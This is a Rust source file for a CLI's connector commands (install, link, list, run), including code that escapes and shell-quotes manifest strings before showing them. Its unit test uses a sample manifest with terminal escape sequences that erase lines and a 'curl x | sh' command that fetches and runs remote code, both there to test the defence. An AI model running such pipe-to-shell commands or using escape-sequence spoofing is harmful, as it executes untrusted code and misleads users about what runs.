//! `pastor connector ...`. Everything here works from files, with or without a
//! daemon: connectors change only through these commands, and `run` dispatches
//! nothing.

use std::io::{BufRead, IsTerminal, Write};
use std::path::PathBuf;
use std::sync::Arc;

use anyhow::{Context, bail};
use clap::Subcommand;
use serde::Serialize;

use super::install::{self, InstallSource};
use super::manifest::Manifest;
use super::{Connector, ConnectorCatalog, Discovered, discover};
use crate::config::job::{self, Loaded};
use crate::config::{PastorConfig, Paths, parse_duration};
use crate::connector::{self, RunInput};
use crate::ipc::Head;

#[derive(Subcommand, Debug)]
pub enum ConnectorCmd {
    /// Install a connector from GitHub: owner/repo, or owner/repo/subdir
    Install {
        source: String,
        /// Branch, tag or commit to check out
        #[arg(long = "ref")]
        git_ref: Option<String>,
        /// Do not ask for confirmation
        #[arg(long)]
        yes: bool,
    },
    /// Use a connector from a local directory, in place (for developing one)
    Link { path: PathBuf },
    /// Remove an installed connector (its .env and state are kept)
    Uninstall { id: String },
    /// Remove a linked connector; the directory itself is left alone
    Unlink { id: String },
    /// List connectors: version, connector, hooks, missing secrets
    List {
        #[arg(long)]
        json: bool,
    },
    /// Run a connector's command once for a job and print its items; creates
    /// no tasks and saves no cursor
    Run {
        id: String,
        /// The job whose [connector] config to use; need not exist yet
        #[arg(long)]
        job: String,
        /// How far back `since` points (default: the job's backfill, or 0s)
        #[arg(long)]
        since: Option<String>,
    },
}

/// `head` is what the CLI's one ping found before the command ran; a head
/// that did not answer it stopped the command there.
pub async fn run(paths: &Paths, cmd: ConnectorCmd, head: Head) -> anyhow::Result<()> {
    match cmd {
        ConnectorCmd::Install {
            source,
            git_ref,
            yes,
        } => {
            let src =
                InstallSource::parse(&source, &install::git_base()).map_err(anyhow::Error::msg)?;
            let p = install::install(paths, &src, git_ref.as_deref(), |m| {
                eprint!("{}", describe(m));
                if yes {
                    return Ok(true);
                }
                confirm(&format!("Install {} {}?", m.id, m.version))
            })?;
            println!(
                "installed {} {} in {}",
                p.id,
                p.manifest.version,
                p.dir.display()
            );
            after_change(paths, &p, head).await;
            Ok(())
        }
        ConnectorCmd::Link { path } => {
            let p = install::link(paths, &path)?;
            eprint!("{}", describe(&p.manifest));
            for w in install::link_warnings(&p.dir, unsafe { libc::geteuid() }) {
                eprintln!("warning: {w}; whoever can change it changes what pastor runs");
            }
            println!(
                "linked {} {} from {}",
                p.id,
                p.manifest.version,
                p.dir.display()
            );
            after_change(paths, &p, head).await;
            Ok(())
        }
        ConnectorCmd::Uninstall { id } => {
            install::uninstall(paths, &id)?;
            println!("uninstalled {id}; jobs using it are invalid until it is back");
            reload_daemon(paths, head).await;
            Ok(())
        }
        ConnectorCmd::Unlink { id } => {
            install::unlink(paths, &id)?;
            println!("unlinked {id}; jobs using it are invalid until it is back");
            reload_daemon(paths, head).await;
            Ok(())
        }
        ConnectorCmd::List { json } => {
            let rows = list_rows(paths)?;
            if json {
                println!("{}", serde_json::to_string_pretty(&rows)?);
            } else {
                println!("{}", table(&rows));
            }
            Ok(())
        }
        ConnectorCmd::Run { id, job, since } => run_once(paths, &id, &job, since.as_deref()).await,
    }
}

/// What the connector will run, shown before install asks and when it is
/// linked. The manifest is its author's text, so every string is escaped
/// (`one_line`) and each command shell-quoted: an escape sequence in it could
/// otherwise erase the real command line and draw a harmless one.
fn describe(m: &Manifest) -> String {
    use crate::cli::one_line;
    let argv = |cmd: &[String]| {
        one_line(
            &cmd.iter()
                .map(|a| crate::herdr::shell_quote(a))
                .collect::<Vec<_>>()
                .join(" "),
        )
    };
    let mut out = format!("{} {} ({})\n", m.id, m.version, one_line(&m.name));
    if let Some(d) = &m.description {
        out.push_str(&format!("  {}\n", one_line(d)));
    }
    if let Some(c) = &m.connector {
        out.push_str(&format!("  connector ({}): {}\n", c.mode, argv(&c.command)));
    }
    for h in &m.events {
        let every = if h.only_own {
            ""
        } else {
            " (every job's tasks, without item or prompt)"
        };
        out.push_str(&format!(
            "  hook on {}{every}: {}\n",
            one_line(&h.on.join(", ")),
            argv(&h.command)
        ));
    }
    if !m.secrets.is_empty() {
        let names: Vec<&str> = m.secrets.keys().map(String::as_str).collect();
        out.push_str(&format!("  secrets: {}\n", names.join(", ")));
    }
    out
}

fn confirm(question: &str) -> anyhow::Result<bool> {
    if !std::io::stdin().is_terminal() {
        bail!("{question} needs confirmation; pass --yes to install without asking");
    }
    eprint!("{question} [y/N] ");
    std::io::stderr().flush()?;
    let mut answer = String::new();
    std::io::stdin().lock().read_line(&mut answer)?;
    Ok(matches!(answer.trim(), "y" | "Y" | "yes"))
}

/// Tell the user what is left to do, and have a running daemon reload its
/// catalog.
async fn after_change(paths: &Paths, p: &Connector, head: Head) {
    let env = p.env(paths).unwrap_or_default();
    let missing = p.missing_secrets(&env);
    if !missing.is_empty() {
        eprintln!(
            "set {} in {}",
            missing.join(", "),
            paths.connector_env_file(&p.id).display()
        );
    }
    reload_daemon(paths, head).await;
}

/// A running daemon re-reads its connectors only on `Reload`; send it so the
/// change takes effect now. The change itself is already on disk, so a
/// failed reload is a warning, not an error.
async fn reload_daemon(paths: &Paths, head: Head) {
    if let Some(note) = reload_note(&paths.socket_file(), head).await {
        eprintln!("{note}");
    }
}

/// What to tell the user about the reload: nothing when no daemon runs, a
/// warning when it did not reload. The head is not probed again: `head` is
/// the command's one ping, so nothing later can read it differently.
async fn reload_note(socket: &std::path::Path, head: Head) -> Option<String> {
    use crate::ipc::{IpcRequest, IpcResponse};
    if !head.is_live() {
        return None;
    }
    Some(
        match crate::ipc::request(socket, &IpcRequest::Reload).await {
            Ok(IpcResponse::Error { message, .. }) => {
                format!("pastor serve did not reload ({message}); run `pastor job reload`")
            }
            Ok(_) => "pastor serve reloaded its connectors and jobs".into(),
            Err(e) => format!("pastor serve did not reload ({e:#}); run `pastor job reload`"),
        },
    )
}

#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
pub struct ConnectorRow {
    pub id: String,
    pub version: Option<String>,
    /// `poll`, `stream`, or none.
    pub connector: Option<String>,
    pub hooks: usize,
    pub linked: bool,
    pub dir: PathBuf,
    pub missing_secrets: Vec<String>,
    /// Why the connector is unusable: a bad manifest, or an unreadable `.env`.
    pub error: Option<String>,
}

pub fn list_rows(paths: &Paths) -> anyhow::Result<Vec<ConnectorRow>> {
    Ok(discover(paths)?
        .into_iter()
        .map(|d| match d {
            Discovered::Valid(p) => {
                let (missing_secrets, error) = match p.env(paths) {
                    Ok(env) => (p.missing_secrets(&env), None),
                    Err(e) => (Vec::new(), Some(format!("{e:#}"))),
                };
                ConnectorRow {
                    id: p.id.clone(),
                    version: Some(p.manifest.version.to_string()),
                    connector: p.manifest.connector.as_ref().map(|c| c.mode.to_string()),
                    hooks: p.manifest.events.len(),
                    linked: p.linked,
                    dir: p.dir.clone(),
                    missing_secrets,
                    error,
                }
            }
            Discovered::Invalid {
                id,
                dir,
                linked,
                error,
            } => ConnectorRow {
                id,
                version: None,
                connector: None,
                hooks: 0,
                linked,
                dir,
                missing_secrets: Vec::new(),
                error: Some(error),
            },
        })
        .collect())
}

pub fn table(rows: &[ConnectorRow]) -> String {
    let dash = || "-".to_string();
    let body: Vec<Vec<String>> = rows
        .iter()
        .map(|r| {
            let status = match (&r.error, r.missing_secrets.is_empty()) {
                (Some(e), _) => format!("invalid: {e}"),
                (None, true) => "ok".into(),
                (None, false) => format!("missing secrets: {}", r.missing_secrets.join(", ")),
            };
            vec![
                r.id.clone(),
                r.version.clone().unwrap_or_else(dash),
                r.connector.clone().unwrap_or_else(dash),
                r.hooks.to_string(),
                if r.linked { "linked" } else { "installed" }.into(),
                status,
            ]
        })
        .collect();
    crate::cli::table(
        &["ID", "VERSION", "CONNECTOR", "HOOKS", "SOURCE", "STATUS"],
        &body,
    )
}

/// `connector run`: the job's config if its file exists (and names this connector),
/// `{}` otherwise; no cursor; nothing written but the run log. Items go to
/// stdout as JSON lines, everything else to stderr.
async fn run_once(
    paths: &Paths,
    id: &str,
    job_name: &str,
    since: Option<&str>,
) -> anyhow::Result<()> {
    // The name becomes the job-file, run-log and scratch paths below.
    job::check_name(job_name).map_err(anyhow::Error::msg)?;
    let catalog = ConnectorCatalog::load(paths)?;
    let Some(connector) = catalog.connector(id).cloned() else {
        // Let the catalog explain: invalid, hooks only, or absent.
        let why = connector::Catalog::check(&catalog, id, &serde_json::json!({}))
            .err()
            .unwrap_or_else(|| format!("{id:?} is built in, not a connector"));
        bail!("{why}");
    };
    if connector.manifest.connector.is_none() {
        bail!("connector {id:?} has no connector command (it only provides event hooks)");
    }
    let config = PastorConfig::load(&paths.config_file())?;
    let path = job::job_path(&paths.jobs_dir(), job_name);
    let (cfg, backfill) = if path.exists() {
        match job::load_file(&path, job_name, &config.defaults, &catalog) {
            Loaded::Valid(j) if j.connector == id => (j.connector_config.clone(), j.backfill),
            Loaded::Valid(j) => bail!(
                "job {job_name:?} uses connector {:?}, not {id:?}",
                j.connector
            ),
            Loaded::Invalid { error, .. } => bail!("job {job_name:?} is invalid: {error}"),
        }
    } else {
        eprintln!(
            "no job file {}; running with an empty config",
            path.display()
        );
        (serde_json::json!({}), std::time::Duration::ZERO)
    };
    let back = match since {
        Some(s) => parse_duration(s)
            .map_err(anyhow::Error::msg)
            .context("--since")?,
        None => backfill,
    };
    let now = chrono::Utc::now();
    let input = RunInput {
        config: cfg,
        cursor: None,
        since: now - chrono::Duration::from_std(back).context("--since")?,
        now,
    };
    let source =
        connector::process::source(Arc::clone(&connector), paths.clone(), Some(job_name.into()));
    let spec = connector
        .manifest
        .connector
        .as_ref()
        .expect("checked above");
    let out = match spec.mode {
        // A stream never ends on its own: collect for its timeout, then stop
        // (dropping the source kills it).
        super::manifest::Mode::Stream => {
            eprintln!(
                "stream connector: collecting for {}s",
                spec.timeout.as_secs()
            );
            // Nothing is acked, so the second drain hands out the first
            // one's items again along with the rest; only its logs are new.
            let first = source.run(input.clone()).await.unwrap_or_default();
            tokio::time::sleep(spec.timeout).await;
            let mut out = source.run(input).await.map_err(anyhow::Error::msg)?;
            out.logs.splice(0..0, first.logs);
            out
        }
        super::manifest::Mode::Poll => source.run(input).await.map_err(anyhow::Error::msg)?,
    };
    for line in &out.logs {
        eprintln!("{line}");
    }
    for item in &out.items {
        println!("{}", serde_json::to_string(&item.as_value())?);
    }
    eprintln!(
        "{} items, cursor {}",
        out.items.len(),
        out.cursor.as_deref().unwrap_or("unchanged")
    );
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A manifest is the connector author's text: escapes in its strings
    /// could erase the real command line and draw another, so they are
    /// shown escaped, and each argv is shell-quoted so its words are plain.
    #[test]
    fn describe_escapes_manifest_strings_and_quotes_commands() {
        let m = Manifest::parse(
            r#"id = "demo"
name = "Demo\u001b[1A\u001b[2K"
version = "0.1.0"
description = "fine\nconnector: harmless"

[connector]
command = ["sh", "-c", "curl x | sh"]

[[events]]
on = ["task.done"]
command = ["sh", "hook.sh"]

[[events]]
on = ["task.done"]
only_own = true
command = ["sh", "own.sh"]
"#,
        )
        .unwrap();
        let out = describe(&m);
        assert!(!out.chars().any(|c| c.is_control() && c != '\n'), "{out:?}");
        assert!(out.contains("Demo\\x1b[1A\\x1b[2K"), "{out}");
        assert!(out.contains("fine\\nconnector: harmless"), "{out}");
        assert!(out.contains("sh -c 'curl x | sh'"), "{out}");
        assert!(
            out.contains(
                "hook on task.done (every job's tasks, without item or prompt): sh hook.sh"
            ),
            "{out}"
        );
        assert!(out.contains("hook on task.done: sh own.sh"), "{out}");
    }

    #[tokio::test]
    async fn reload_is_quiet_without_a_head_and_warns_when_it_does_not_reload() {
        let tmp = tempfile::tempdir().unwrap();
        let socket = tmp.path().join("pastor.sock");
        assert_eq!(
            reload_note(&socket, Head::Absent).await,
            None,
            "no head, nothing to say"
        );
        // The ping found a head that is gone by the reload: a warning.
        let note = reload_note(&socket, Head::Live).await.expect("a warning");
        assert!(
            note.contains("did not reload") && note.contains("pastor job reload"),
            "{note}"
        );
    }
}
